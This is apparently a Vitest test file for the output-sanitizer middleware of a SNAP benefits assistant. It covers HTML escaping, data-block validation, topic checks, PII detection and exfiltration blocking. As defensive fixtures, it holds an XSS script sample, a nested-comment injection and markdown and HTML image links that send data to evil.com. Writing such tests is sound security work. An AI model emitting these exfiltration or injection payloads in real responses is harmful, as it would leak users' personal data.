import { describe, it, expect } from "vitest";

const {
  sanitizeForDisplay,
  validateDataBlockCount,
  sanitizeAIResponse,
  MAX_DATA_BLOCKS_PER_RESPONSE,
  checkTopicRelevance,
  scanOutputForPII,
  blockExfiltration,
} = require("../src/middleware/outputSanitizer");

describe("sanitizeForDisplay", () => {
  it("escapes HTML special characters", () => {
    expect(sanitizeForDisplay("<script>alert('xss')</script>")).toBe(
      "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;"
    );
  });

  it("escapes ampersands", () => {
    expect(sanitizeForDisplay("A & B")).toBe("A &amp; B");
  });

  it("escapes quotes", () => {
    expect(sanitizeForDisplay('He said "hello"')).toBe("He said &quot;hello&quot;");
  });

  it("preserves normal SNAP-related text", () => {
    expect(sanitizeForDisplay("I make $1200 biweekly")).toBe("I make $1200 biweekly");
  });

  it("handles empty and non-string inputs", () => {
    expect(sanitizeForDisplay("")).toBe("");
    expect(sanitizeForDisplay(null)).toBe("");
    expect(sanitizeForDisplay(undefined)).toBe("");
    expect(sanitizeForDisplay(123)).toBe("");
  });
});

describe("validateDataBlockCount", () => {
  it("allows normal responses with few data blocks", () => {
    const response = 'Hello! <!--CUSHION_DATA:{"field":"household_member","display_name":"John"}-->';
    expect(validateDataBlockCount(response).safe).toBe(true);
    expect(validateDataBlockCount(response).count).toBe(1);
  });

  it("allows responses with no data blocks", () => {
    const response = "Let me ask about your income.";
    const result = validateDataBlockCount(response);
    expect(result.safe).toBe(true);
    expect(result.count).toBe(0);
  });

  it("flags excessive data blocks as unsafe", () => {
    const blocks = Array.from({ length: 10 }, (_, i) =>
      `<!--CUSHION_DATA:{"field":"household_member","display_name":"Member ${i}"}-->`
    ).join("\n");
    const result = validateDataBlockCount(blocks);
    expect(result.safe).toBe(false);
    expect(result.count).toBe(10);
  });

  it("allows up to MAX_DATA_BLOCKS_PER_RESPONSE blocks", () => {
    const blocks = Array.from({ length: MAX_DATA_BLOCKS_PER_RESPONSE }, (_, i) =>
      `<!--CUSHION_DATA:{"field":"household_member","display_name":"Member ${i}"}-->`
    ).join("\n");
    const result = validateDataBlockCount(blocks);
    expect(result.safe).toBe(true);
  });
});

describe("sanitizeAIResponse", () => {
  it("preserves valid CUSHION_DATA blocks", () => {
    const response = 'Hello! <!--CUSHION_DATA:{"field":"shelter_rent","value":1200}-->';
    expect(sanitizeAIResponse(response)).toBe(response);
  });

  it("strips data blocks with nested HTML comments (injection attempt)", () => {
    const response = '<!--CUSHION_DATA:{"field":"shelter_rent","value":1200}<!-- injected -->-->';
    const cleaned = sanitizeAIResponse(response);
    expect(cleaned).not.toContain("CUSHION_DATA");
  });

  it("strips data blocks with script tags", () => {
    const response = '<!--CUSHION_DATA:<script>alert(1)</script>-->';
    const cleaned = sanitizeAIResponse(response);
    expect(cleaned).not.toContain("script");
  });

  it("strips data blocks with invalid JSON", () => {
    const response = "<!--CUSHION_DATA:not valid json-->";
    const cleaned = sanitizeAIResponse(response);
    expect(cleaned).not.toContain("CUSHION_DATA");
  });

  it("handles non-string input", () => {
    expect(sanitizeAIResponse(null)).toBe("");
    expect(sanitizeAIResponse(undefined)).toBe("");
    expect(sanitizeAIResponse(123)).toBe("");
  });

  it("preserves surrounding text when stripping bad blocks", () => {
    const response = "Your rent is $1200. <!--CUSHION_DATA:bad json--> Thank you!";
    const cleaned = sanitizeAIResponse(response);
    expect(cleaned).toContain("Your rent is $1200.");
    expect(cleaned).toContain("Thank you!");
  });
});

// ── New: Topic relevance guardrail ──────────────────────────────────

describe("checkTopicRelevance", () => {
  it("accepts on-topic SNAP responses", () => {
    const response = "Thank you! Now let me ask about your household income. How many members in your household have employment income? I need to collect information about each income source for the SNAP application.";
    const result = checkTopicRelevance(response);
    expect(result.onTopic).toBe(true);
  });

  it("accepts short responses without checking (greetings, confirmations)", () => {
    const result = checkTopicRelevance("Got it, thank you!");
    expect(result.onTopic).toBe(true);
  });

  it("flags completely off-topic responses", () => {
    const response = "Here is a recipe for chocolate cake. First, preheat your oven to 350 degrees. Mix the flour, sugar, and cocoa powder together in a large bowl. Add the eggs and vanilla extract. Bake for 30 minutes until a toothpick comes out clean.";
    const result = checkTopicRelevance(response);
    expect(result.onTopic).toBe(false);
  });

  it("accepts responses about eligibility rules", () => {
    const response = "Great question! For SNAP eligibility, the household income limit depends on your household size. For a household of 3, the gross income limit is $2,311 per month. The standard deduction also varies by household size. Your caseworker will review all your information to make the final determination.";
    const result = checkTopicRelevance(response);
    expect(result.onTopic).toBe(true);
  });

  it("handles empty and non-string inputs", () => {
    expect(checkTopicRelevance("").onTopic).toBe(true);
    expect(checkTopicRelevance(null).onTopic).toBe(true);
    expect(checkTopicRelevance(undefined).onTopic).toBe(true);
  });
});

// ── New: Output PII scanner ─────────────────────────────────────────

describe("scanOutputForPII", () => {
  it("detects SSN in output", () => {
    const result = scanOutputForPII("Your SSN is 123-45-6789.");
    expect(result.clean).toBe(false);
    expect(result.piiFound).toContain("SSN");
  });

  it("detects phone numbers in output", () => {
    const result = scanOutputForPII("Call us at (404) 555-1234.");
    expect(result.clean).toBe(false);
    expect(result.piiFound).toContain("phone_number");
  });

  it("detects email addresses in output", () => {
    const result = scanOutputForPII("Email me at john@example.com.");
    expect(result.clean).toBe(false);
    expect(result.piiFound).toContain("email");
  });

  it("detects street addresses in output", () => {
    const result = scanOutputForPII("You live at 123 Main St.");
    expect(result.clean).toBe(false);
    expect(result.piiFound).toContain("street_address");
  });

  it("detects date of birth patterns", () => {
    const result = scanOutputForPII("Your DOB is 01/15/1990.");
    expect(result.clean).toBe(false);
    expect(result.piiFound).toContain("date_of_birth");
  });

  it("allows clean SNAP responses", () => {
    const result = scanOutputForPII("Your household has 3 members. Your gross monthly income is $2,400.");
    expect(result.clean).toBe(true);
  });

  it("handles non-string input", () => {
    expect(scanOutputForPII(null).clean).toBe(true);
    expect(scanOutputForPII(undefined).clean).toBe(true);
  });
});

// ── New: Exfiltration blocker ───────────────────────────────────────

describe("blockExfiltration", () => {
  it("blocks markdown image exfiltration", () => {
    const response = "Here is your data: ![secret](https://evil.com/steal?data=ssn123)";
    const result = blockExfiltration(response);
    expect(result.safe).toBe(false);
    expect(result.threats).toContain("markdown_image_exfiltration");
    expect(result.cleaned).not.toContain("evil.com");
    expect(result.cleaned).toContain("[image removed for security]");
  });

  it("blocks HTML image tags", () => {
    const response = 'Look at this: <img src="https://evil.com/steal?data=test" />';
    const result = blockExfiltration(response);
    expect(result.safe).toBe(false);
    expect(result.threats).toContain("html_image_exfiltration");
    expect(result.cleaned).not.toContain("evil.com");
  });

  it("blocks URLs with long query strings (data exfiltration)", () => {
    const longQuery = "a".repeat(150);
    const response = `Visit https://evil.com/track?data=${longQuery} for details`;
    const result = blockExfiltration(response);
    expect(result.safe).toBe(false);
    expect(result.threats).toContain("url_query_exfiltration");
  });

  it("blocks external URLs entirely (SNAP assistant has no reason to link)", () => {
    const response = "For more info, visit https://some-external-site.com/page";
    const result = blockExfiltration(response);
    expect(result.safe).toBe(false);
    expect(result.threats).toContain("external_url");
    expect(result.cleaned).toContain("[link removed]");
  });

  it("allows clean text responses", () => {
    const response = "Thank you! Your rent of $1200 has been recorded. Now let me ask about utilities.";
    const result = blockExfiltration(response);
    expect(result.safe).toBe(true);
  });

  it("handles non-string input", () => {
    expect(blockExfiltration(null).safe).toBe(true);
    expect(blockExfiltration(undefined).safe).toBe(true);
  });
});
